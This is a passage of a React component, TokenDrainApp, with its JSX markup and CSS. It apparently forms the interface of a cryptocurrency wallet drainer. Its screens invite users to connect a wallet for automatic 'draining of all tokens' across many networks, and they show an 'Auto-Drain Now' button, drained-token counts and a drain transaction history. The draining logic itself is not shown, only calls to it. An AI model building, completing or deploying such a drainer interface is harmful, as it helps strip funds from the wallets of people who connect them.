                <ConnectKitButton />
              </div>
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : '✅'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">AUTO-DRAIN SYSTEM ACTIVE</div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        <div className="progress-bar">
                          <div 
                            className="progress-fill" 
                            style={{ width: `${scanProgress}%` }}
                          ></div>
                        </div>
                        <div className="progress-text">Scanning: {scanProgress}%</div>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {backendOnline ? '✅ Online' : '⚠️ Offline'}
                    </div>
                    <div className="stat-label">Backend</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{transactions.length}</div>
                    <div className="stat-label">Drained</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <button
                  onClick={forceRescan}
                  disabled={isScanning || isProcessing}
                  className="btn btn-scan"
                >
                  {isScanning ? `Scanning ${scanProgress}%` : '🔍 Force Rescan'}
                </button>
                
                {tokens.length > 0 && (
                  <button
                    onClick={() => autoDrain()}
                    disabled={isProcessing}
                    className="btn btn-drain"
                  >
                    {isProcessing ? 'Processing...' : '⚡ Auto-Drain Now'}
                  </button>
                )}
              </div>

              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens ({tokens.length}) - Auto-Drain Ready</h3>
                    <div className="total-value">Total: ${totalValue.toFixed(2)}</div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className={`token-card ${token.status}`}>
                        <div className="token-header">
                          <div className="token-symbol">{token.symbol}</div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'EVM' : 'Non-EVM'}
                          </div>
                        </div>
                        <div className="token-amount">{token.amount} {token.symbol}</div>
                        <div className="token-value">${token.valueUSD.toFixed(2)}</div>
                        <div className="token-status">
                          <span className={`status-${token.status || 'detected'}`}>
                            {token.status === 'drained' ? '✅ Drained' : '⚡ Auto-drain pending'}
                          </span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Transactions History */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Drain History ({transactions.length})</h3>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 10).map((tx, index) => (
                      <div key={index} className="transaction-item">
                        <div className="tx-info">
                          <div className="tx-symbol">{tx.symbol}</div>
                          <div className="tx-amount">{tx.amount} {tx.symbol}</div>
                          <div className="tx-network">{tx.network}</div>
                        </div>
                        <div className="tx-hash">
                          {tx.txHash?.substring(0, 20)}...
                        </div>
                        <div className="tx-status success">✅ Drained</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Error Message */}
              {connectionError && (
                <div className="error-alert">
                  <div className="error-icon">⚠️</div>
                  <div className="error-message">{connectionError}</div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>Universal Auto-Drain System</h2>
                <p className="welcome-text">
                  Connect your wallet for automatic detection and draining of all tokens
                  across 50+ EVM and Non-EVM networks. Fully automated - no manual steps required.
                </p>
                
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                
                <div className="network-stats">
                  <div className="stat-item">
                    <div className="stat-number">25+</div>
                    <div className="stat-label">EVM Networks</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-number">10+</div>
                    <div className="stat-label">Non-EVM</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-number">Auto</div>
                    <div className="stat-label">Full Automation</div>
                  </div>
                </div>
                
                <div className="features-list">
                  <div className="feature">
                    <span className="feature-icon">✅</span>
                    <span>Automatic wallet scanning</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">✅</span>
                    <span>Auto-drain all detected tokens</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">✅</span>
                    <span>Both EVM and Non-EVM support</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">✅</span>
                    <span>Live transaction monitoring</span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span className="status-dot"></span>
            <span>Universal Auto-Drain • Production v3.0 • Fully Automated</span>
            <span>{backendOnline ? '✅ Backend Connected' : '⚠️ Backend Offline'}</span>
            {lastScanTime && (
              <span>Last scan: {new Date(lastScanTime).toLocaleTimeString()}</span>
            )}
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
          flex-wrap: wrap;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Controls */
        .controls-container {
          display: flex;
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .btn {
          flex: 1;
          padding: 16px 24px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .btn-scan {
          background: linear-gradient(135deg, #1e40af, #3b82f6);
          color: white;
        }
        
        .btn-scan:hover:not(:disabled) {
          background: linear-gradient(135deg, #1e3a8a, #2563eb);
          transform: translateY(-2px);
        }
        
        .btn-drain {
          background: linear-gradient(135deg, #dc2626, #ef4444);
          color: white;
        }
        
        .btn-drain:hover:not(:disabled) {
          background: linear-gradient(135deg, #b91c1c, #dc2626);
          transform: translateY(-2px);
        }
        
        /* Tokens */
        .tokens-panel, .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .total-value {
          font-size: 18px;
          font-weight: 700;
          color: #10b981;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
          transition: all 0.3s;
        }
        
        .token-card:hover {
          border-color: #444;
          transform: translateY(-2px);
        }
        
        .token-card.drained {
          opacity: 0.7;
          border-color: #10b981;
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 20px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 10px;
        }
        
        .token-status .status-detected {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
        }
        
        .token-status .status-drained {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
        }
        
        /* Transactions */
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 8px;
          padding: 15px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          border: 1px solid #333;
        }
        
        .tx-info {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .tx-symbol {
          font-weight: 600;
          font-size: 16px;
          color: white;
        }
        
        .tx-amount {
          color: #ddd;
          font-size: 14px;
        }
        
        .tx-network {
          color: #888;
          font-size: 12px;
          background: rgba(136, 136, 136, 0.1);
          padding: 2px 6px;
          border-radius: 4px;
        }
        
        .tx-hash {
          color: #3b82f6;
          font-size: 12px;
          font-family: monospace;
          flex: 1;
          text-align: center;
        }
        
        .tx-status.success {
          color: #10b981;
          font-size: 12px;
          font-weight: 600;
        }
        
        /* Error Alert */
        .error-alert {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: pulse-alert 2s infinite;
        }
        
        @keyframes pulse-alert {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        
        .error-icon {
          font-size: 24px;
        }
        
        .error-message {
          flex: 1;
          color: white;
          font-size: 14px;
        }
        
        /* Welcome Screen */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 30px;
          font-size: 18px;
          line-height: 1.6;
        }
        
        .network-stats {
          display: flex;
          justify-content: center;
          gap: 40px;
          margin: 30px 0;
        }
        
        .stat-item {
          text-align: center;
        }
        
        .stat-number {
          font-size: 36px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        .features-list {
          text-align: left;
          max-width: 400px;
          margin: 30px auto 0;
        }
        
        .feature {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
          color: #ddd;
        }
        
        .feature-icon {
          color: #10b981;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 15px;
          flex-wrap: wrap;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Progress Bar */
        .scan-progress {
          margin-top: 15px;
        }
        
        .progress-bar {
          height: 6px;
          background: #333;
          border-radius: 3px;
          overflow: hidden;
        }
        
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #3b82f6, #10b981);
          transition: width 0.3s;
        }
        
        .progress-text {
          font-size: 12px;
          color: #888;
          margin-top: 5px;
          text-align: right;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .app-header {
            flex-direction: column;
            gap: 20px;
            text-align: center;
          }
          
          .connected-wallet {
            flex-wrap: wrap;
            justify-content: center;
          }
          
          .stats-row {
            flex-direction: column;
          }
          
          .controls-container {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .transaction-item {
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
          
          .network-stats {
            gap: 20px;
          }
          
          .stat-number {
            font-size: 28px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
